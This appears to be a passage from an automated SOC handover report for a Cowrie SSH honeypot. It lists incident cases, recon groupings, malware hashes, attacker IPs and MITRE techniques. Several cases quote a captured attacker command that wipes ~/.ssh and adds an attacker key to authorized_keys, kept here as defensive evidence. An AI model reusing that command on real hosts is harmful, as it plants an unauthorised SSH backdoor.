| `2026-04-22 09:15:25` | `cowrie.login.success` |
| `2026-04-22 09:15:25` | `cowrie.session.params` |
| `2026-04-22 09:15:25` | `cowrie.command.input` |
| `2026-04-22 09:15:25` | `cowrie.command.failed` |
| `2026-04-22 09:15:25` | `cowrie.log.closed` |
| `2026-04-22 09:15:26` | `cowrie.session.params` |
| `2026-04-22 09:15:26` | `cowrie.command.input` |
| `2026-04-22 09:15:26` | `cowrie.session.file_download` |
| `2026-04-22 09:15:26` | `cowrie.log.closed` |
| `2026-04-22 09:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e7e2d66f915

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:15 |
| **Last Seen** | 2026-04-22 09:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:15:28` | `cowrie.session.connect` |
| `2026-04-22 09:15:28` | `cowrie.client.version` |
| `2026-04-22 09:15:28` | `cowrie.client.kex` |
| `2026-04-22 09:15:29` | `cowrie.login.success` |
| `2026-04-22 09:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60b61ab6900b

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:17 |
| **Last Seen** | 2026-04-22 09:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:17:48` | `cowrie.session.connect` |
| `2026-04-22 09:17:48` | `cowrie.client.version` |
| `2026-04-22 09:17:48` | `cowrie.client.kex` |
| `2026-04-22 09:17:49` | `cowrie.login.success` |
| `2026-04-22 09:17:49` | `cowrie.session.params` |
| `2026-04-22 09:17:49` | `cowrie.command.input` |
| `2026-04-22 09:17:49` | `cowrie.command.failed` |
| `2026-04-22 09:17:49` | `cowrie.log.closed` |
| `2026-04-22 09:17:50` | `cowrie.session.params` |
| `2026-04-22 09:17:50` | `cowrie.command.input` |
| `2026-04-22 09:17:50` | `cowrie.session.file_download` |
| `2026-04-22 09:17:50` | `cowrie.log.closed` |
| `2026-04-22 09:17:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92ada5c219a4

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:17 |
| **Last Seen** | 2026-04-22 09:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:17:52` | `cowrie.session.connect` |
| `2026-04-22 09:17:52` | `cowrie.client.version` |
| `2026-04-22 09:17:52` | `cowrie.client.kex` |
| `2026-04-22 09:17:53` | `cowrie.login.success` |
| `2026-04-22 09:17:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d25a71371664

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:20 |
| **Last Seen** | 2026-04-22 09:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:20:26` | `cowrie.session.connect` |
| `2026-04-22 09:20:26` | `cowrie.client.version` |
| `2026-04-22 09:20:26` | `cowrie.client.kex` |
| `2026-04-22 09:20:27` | `cowrie.login.success` |
| `2026-04-22 09:20:27` | `cowrie.session.params` |
| `2026-04-22 09:20:27` | `cowrie.command.input` |
| `2026-04-22 09:20:27` | `cowrie.command.failed` |
| `2026-04-22 09:20:27` | `cowrie.log.closed` |
| `2026-04-22 09:20:28` | `cowrie.session.params` |
| `2026-04-22 09:20:28` | `cowrie.command.input` |
| `2026-04-22 09:20:28` | `cowrie.session.file_download` |
| `2026-04-22 09:20:28` | `cowrie.log.closed` |
| `2026-04-22 09:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f519524e56ae

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:20 |
| **Last Seen** | 2026-04-22 09:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:20:30` | `cowrie.session.connect` |
| `2026-04-22 09:20:30` | `cowrie.client.version` |
| `2026-04-22 09:20:30` | `cowrie.client.kex` |
| `2026-04-22 09:20:31` | `cowrie.login.success` |
| `2026-04-22 09:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70acabfa48b2

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:22 |
| **Last Seen** | 2026-04-22 09:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:22:49` | `cowrie.session.connect` |
| `2026-04-22 09:22:49` | `cowrie.client.version` |
| `2026-04-22 09:22:49` | `cowrie.client.kex` |
| `2026-04-22 09:22:49` | `cowrie.login.success` |
| `2026-04-22 09:22:50` | `cowrie.session.params` |
| `2026-04-22 09:22:50` | `cowrie.command.input` |
| `2026-04-22 09:22:50` | `cowrie.command.failed` |
| `2026-04-22 09:22:50` | `cowrie.log.closed` |
| `2026-04-22 09:22:50` | `cowrie.session.params` |
| `2026-04-22 09:22:50` | `cowrie.command.input` |
| `2026-04-22 09:22:50` | `cowrie.session.file_download` |
| `2026-04-22 09:22:50` | `cowrie.log.closed` |
| `2026-04-22 09:22:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0e80b5c5e03

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:22 |
| **Last Seen** | 2026-04-22 09:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:22:52` | `cowrie.session.connect` |
| `2026-04-22 09:22:52` | `cowrie.client.version` |
| `2026-04-22 09:22:53` | `cowrie.client.kex` |
| `2026-04-22 09:22:53` | `cowrie.login.success` |
| `2026-04-22 09:22:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.62.216[.]38` | **26** | 2026-04-22 06:41 | 2026-04-22 08:31 | 1m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `219.152.170[.]58` | **26** | 2026-04-22 06:21 | 2026-04-22 06:49 | 38m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.135[.]154` | **23** | 2026-04-22 06:25 | 2026-04-22 06:44 | 37m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `81.192.46[.]45` | **16** | 2026-04-22 08:41 | 2026-04-22 09:22 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `18.116.101[.]220` | **7** | 2026-04-22 08:56 | 2026-04-22 09:03 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `20.83.27[.]140` | **2** | 2026-04-22 08:38 | 2026-04-22 08:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.199[.]144` | 1 | 2026-04-22 09:04 | 2026-04-22 09:04 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.106[.]205` | 1 | 2026-04-22 06:21 | 2026-04-22 06:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.71.18[.]4` | 1 | 2026-04-22 06:23 | 2026-04-22 06:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.84[.]166` | 1 | 2026-04-22 06:24 | 2026-04-22 06:25 | 98s | 0 | `T1592` | 🟢 LOW |
| `140.246.108[.]106` | 1 | 2026-04-22 08:58 | 2026-04-22 09:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]141` | 1 | 2026-04-22 07:56 | 2026-04-22 07:56 | 30s | 0 | `T1592` | 🟢 LOW |
| `207.180.238[.]248` | 1 | 2026-04-22 09:12 | 2026-04-22 09:12 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.104.145[.]245` | 1 | 2026-04-22 06:12 | 2026-04-22 06:12 | 8s | 0 | `T1592` | 🟢 LOW |
| `59.103.104[.]89` | 1 | 2026-04-22 07:28 | 2026-04-22 07:29 | 12s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]65` | 1 | 2026-04-22 09:22 | 2026-04-22 09:22 | 10s | 0 | `T1592` | 🟢 LOW |
| `74.243.239[.]219` | 1 | 2026-04-22 06:15 | 2026-04-22 06:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.156.14[.]80` | 1 | 2026-04-22 07:56 | 2026-04-22 07:56 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `207.180.238[.]248` | FR | Contabo GmbH | **100** ⚠️ | 33 |
| `176.65.148[.]141` | NL | Pfcloud UG | **100** ⚠️ | 13 |
| `101.96.199[.]144` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 9 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `74.243.239[.]219` | AE | Microsoft Corporation | **100** ⚠️ | 50 |
| `140.246.108[.]106` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 28 |
| `124.71.18[.]4` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **100** ⚠️ | 3 |
| `218.90.235[.]58` | CN | Jingjiang Jingcheng Feixiang Make  Up Corp | **100** ⚠️ | 4 |
| `71.6.199[.]65` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `120.48.106[.]205` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 195 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 89 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 67 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 33 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 33 |

---

## 🔕 False Positive Summary (120 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 32 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 22 below threshold 25 | 26 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 59 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 299 cases |
| Tool 34  | Credential Extractor        | ✅ 162 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 120 filtered (40.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 23 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 67 priority case(s) shown individually · 18 recon entry/entries in table (6 group(s) consolidating 100 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-22T09:26:14Z_
